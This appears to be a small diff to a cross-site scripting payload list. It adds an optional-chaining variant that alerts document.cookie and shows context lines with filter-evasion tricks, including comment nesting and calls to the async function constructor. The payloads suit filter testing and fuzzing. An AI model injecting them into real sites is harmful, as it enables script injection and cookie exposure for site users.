@@ -1,3 +1,4 @@
+alert?.(document?.cookie)
 <script>x = '<!--<script>'/*</script>-->*/;alert(1)</script
 (async function(){}).constructor('alert(1)')();
 (async function*(){}).constructor('alert(2)')().next();
